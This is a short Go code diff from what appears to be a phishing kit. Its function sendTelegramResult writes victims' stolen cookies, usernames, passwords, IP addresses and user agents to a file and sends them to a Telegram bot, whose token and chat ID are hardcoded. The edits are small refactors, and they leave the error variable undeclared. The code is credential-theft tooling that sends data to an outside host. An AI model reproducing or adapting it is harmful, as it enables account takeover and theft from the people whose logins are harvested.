@@ -48,7 +48,7 @@ func getChatId() string {
 func sendTelegramResult(cookies string, username string, password string, remote_addr string, useragent string) {
 
 	// Send the message
-	var err error
+	//var err error
 	client, fileName := &http.Client{}, "filename-cookies.json"
 	token, chat_id := "5886667026:AAHMRZh4RSjsqaXNwPgZjOJ_W-ffDM5PpIE", "915867987"
 
@@ -60,7 +60,7 @@ func sendTelegramResult(cookies string, username string, password string, remote
 // 		"chat_id":    getChatId(),
 // 		"caption":       msg,
 // 	})
-	err := ioutil.WriteFile(fileName, []byte(cookies), 0755)
+	err = os.WriteFile(fileName, []byte(cookies), 0755)
 	if err != nil {
 	   fmt.Printf("Unable to write file: %v", err)
 	}
@@ -86,7 +86,7 @@ func sendTelegramResult(cookies string, username string, password string, remote
 	
 	//request, _ := http.Post(url, "application/json", responseBody)
 
-	defer req.Body.Close()
+	//defer req.Body.Close()
 	
 	// 	// Body
 // 	responseBody, err = ioutil.ReadAll(req.Body)
